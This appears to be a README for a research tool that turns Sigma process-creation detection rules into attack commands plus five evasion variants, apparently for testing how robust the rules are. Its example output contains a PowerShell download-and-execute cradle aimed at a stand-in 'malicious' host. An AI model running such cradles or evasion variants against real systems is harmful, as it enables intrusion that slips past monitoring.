# 🛠️ Evasion Command Generator – `attack_convert/`

This tool is designed to **generate original and evasion attack commands** based on Sigma rules from the `process_creation` category. It supports five evasion techniques and exports the result in JSON format for further analysis or simulation.

---

## 📁 Folder Structure

```plaintext
Sigma-automation/
├── src/
│   ├── attack_convert/
│   │   ├── main.py                    # Entry point to generate evasion commands
│   │   ├── count_successful_rules.py  # Statistics for rule parsing
│   │   ├── utils/
│   │   │   ├── parser.py              # Extracts command line from Sigma rule
│   │   │   ├── evasions_core.py       # Main controller for all evasion techniques
│   │   │   └── evasions/
│   │   │       ├── insertion.py       # Evasion technique: Insertion
│   │   │       ├── substitution.py    # Evasion technique: Substitution
│   │   │       ├── omission.py        # Evasion technique: Omission
│   │   │       ├── reordering.py      # Evasion technique: Reordering
│   │   │       ├── recoding.py        # Evasion technique: Recoding
│   │   │       └── substitution_mapping.json  # Command substitution mappings
│   │   └── Evasion-Results/           # Generated attack commands
├── data/
│   ├── rules/
│   │   └── windows/
│   │       └── process_creation/      # Sigma rules
│   └── evasion_possible_rules.txt     # List of rules to process
└── output/
    └── results/                       # Analysis results
```

---

## 🚀 How to Run

### 1. Prepare Input

- Place all Sigma rule files (`.yml`) in:

  ```plaintext
  data/rules/windows/process_creation/
  ```

- Create a file `data/evasion_possible_rules.txt` listing rules (by filename without `.yml`) that should be processed for evasion.

---

### 2. Run the Tool

> From the **project root** (`Sigma-automation/`):

#### Windows Command Prompt (CMD)

```cmd
set PYTHONPATH=%CD%
python -m src.attack_convert.main
```

#### PowerShell

```powershell
$env:PYTHONPATH = $PWD
python -m src.attack_convert.main
```

---

## 📤 Output

- Generated files will be saved to:

  ```plaintext
  src/attack_convert/Evasion-Results/
  ```

- Each `.json` result includes:
  - The original attack command
  - Five evasion variations:
    - `insertion`
    - `substitution`
    - `omission`
    - `reordering`
    - `recoding`

---

### 📄 Example Output

```json
{
  "rule_name": "suspicious_powershell_0",
  "original_command": "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious')\"",
  "evasions": {
    "insertion": "powershell.exe -Command \"<obfuscated-inserted-command>\"",
    "substitution": "powershell.exe -c \"<alias-used-command>\"",
    "omission": "powershell.exe \"<command with removed parameters>\"",
    "reordering": "powershell.exe \"<reordered arguments>\" -Command",
    "recoding": "powershell.exe -EncodedCommand <base64-encoded-command>"
  }
}
```

---

## 📦 Requirements

- Python 3.10+
- Install dependencies:

```bash
pip install pyyaml
```

---

## ✅ Notes

- Make sure your working directory is the **project root**, not inside `src/attack_convert/`.
- `PYTHONPATH` must point to the root folder to allow relative imports.
- The tool uses relative paths, so it will work regardless of where the project is located on your system.
